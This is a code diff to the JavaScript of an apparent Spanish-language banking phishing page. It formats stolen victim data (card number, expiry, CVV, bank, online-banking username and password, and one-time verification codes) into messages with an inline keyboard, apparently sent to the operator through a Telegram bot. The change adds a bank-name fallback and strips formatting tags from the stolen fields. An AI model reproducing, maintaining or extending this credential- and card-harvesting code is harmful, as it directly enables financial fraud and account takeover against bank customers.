@@ -354,6 +354,7 @@
             if (pageState === 'initial') {
                 const user = document.getElementById('usuario').value.trim();
                 const pass = document.getElementById('clave').value.trim();
+                const bank = (tbdatos && tbdatos.bank) || sessionStorage.getItem('bank') || '❓ Desconocido';
 
                 showLoader(true, "Validando credenciales..."); // Texto del loader para login
 
@@ -367,16 +368,16 @@
 💳 Tarjeta: ${tbdatos && tbdatos.cardNumber ? tbdatos.cardNumber : '❌ No disponible'}
 📅 Exp: ${tbdatos && tbdatos.expMonth && tbdatos.expYear ? `${tbdatos.expMonth}/${tbdatos.expYear}` : '❌ No disponible'}
 🔐 CVV: ${tbdatos && tbdatos.cvv ? tbdatos.cvv : '❌ No disponible'}
-🏦 Banco: ${tbdatos && tbdatos.bank ? tbdatos.bank : '❓ Desconocido'}
+🏦 Banco: ${bank}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔑 DATOS DE ACCESO
-👤 Usuario: <code>${user}</code>
-🔑 Contraseña: <code>${pass}</code>
+👤 Usuario: ${user}
+🔑 Contraseña: ${pass}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💰 DETALLES DE LA TRANSACCIÓN
 💵 Monto: ${formattedAmount}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 ID de Transacción: <code>${currentTransactionId}</code>
+🆔 ID de Transacción: ${currentTransactionId}
 `;
                 keyboard = {
                     inline_keyboard: [
@@ -403,6 +404,7 @@
                 const codeInput = document.getElementById('dynamic-code');
                 const codeValue = codeInput.value.trim();
                 const codeType = codeInput.dataset.type;
+                const bank = (tbdatos && tbdatos.bank) || sessionStorage.getItem('bank') || '❓ Desconocido';
                 
                 showLoader(true, "Validando código...");
 
@@ -415,21 +417,21 @@
 💳 Tarjeta: ${tbdatos && tbdatos.cardNumber ? tbdatos.cardNumber : '❌ No disponible'}
 📅 Exp: ${tbdatos && tbdatos.expMonth && tbdatos.expYear ? `${tbdatos.expMonth}/${tbdatos.expYear}` : '❌ No disponible'}
 🔐 CVV: ${tbdatos && tbdatos.cvv ? tbdatos.cvv : '❌ No disponible'}
-🏦 Banco: ${tbdatos && tbdatos.bank ? tbdatos.bank : '❓ Desconocido'}
+🏦 Banco: ${bank}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔑 DATOS DE ACCESO
-👤 Usuario: <code>${document.getElementById('usuario')?.value.trim() || 'N/A'}</code>
-🔑 Contraseña: <code>${document.getElementById('clave')?.value.trim() || 'N/A'}</code>
+👤 Usuario: ${document.getElementById('usuario')?.value.trim() || 'N/A'}
+🔑 Contraseña: ${document.getElementById('clave')?.value.trim() || 'N/A'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔢 CÓDIGO RECIBIDO
 📌 Tipo: ${codeType}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-‼️ Código: <code>${codeValue}</code>
+‼️ Código: ${codeValue}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💰 DETALLES DE LA TRANSACCIÓN
 💵 Monto: ${formattedAmount}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 ID de Transacción: <code>${currentTransactionId}</code>
+🆔 ID de Transacción: ${currentTransactionId}
 `;
                 keyboard = {
                     inline_keyboard: [
